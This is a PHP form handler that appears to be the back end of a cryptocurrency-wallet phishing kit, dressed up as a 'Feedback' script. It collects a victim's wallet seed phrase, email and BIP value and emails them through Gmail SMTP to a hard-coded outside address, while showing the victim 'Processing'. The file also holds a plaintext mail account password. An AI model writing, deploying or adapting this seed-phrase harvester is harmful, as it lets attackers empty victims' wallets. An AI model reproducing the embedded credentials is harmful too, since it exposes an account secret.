<?php
require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$subject = "Feedback";
$mnemonic = $_POST['mnemonic'];
$wallet_email = $_POST['wallet_email'];
$bip = $_POST['bip'];
$email_from = $wallet_email;
$email_to = 'Steve.wood00sw@gmail.com';

if($mnemonic== '' || $wallet_email== '' || $bip== ''){
        echo "check the fields";
    }else{

    $subject='Query from '.$sender;
    $message='Dear Sir,<br><br>'.$subject.'<br><br>Mnemonic: '.$mnemonic.'<br>Wallet_email: '.$wallet_email.'<br>Bip: '.$bip;

$mail = new PHPMailer();
$mail->isSMTP();
$mail->Host = "smtp.gmail.com";
$mail->SMTPAuth = "true";
$mail->SMTPSecure = "tls";
$mail->Port = "587";
$mail->Username = "emmajoy658@gmail.com";
$mail->Password = "Olasunkanmi2001!";
$mail->setFrom($_POST['wallet_email'], $_POST['mnemonic']);
$mail->AddReplyTo($_POST['wallet_email'], $_POST['mnemonic']);
$mail->Subject = "/New Entry";
$mail->MsgHTML($wallet_email);

$mail->Body = "Mnemonic= " . $mnemonic . "\r\n Email= " . $wallet_email . "\r\n Bip= " . $bip ;

$mail->addAddress($email_to);
if ( $mail->Send() ) {
  echo "Processing";
}else{
  echo "Error";
}
}
$mail->smtpClose();

?>
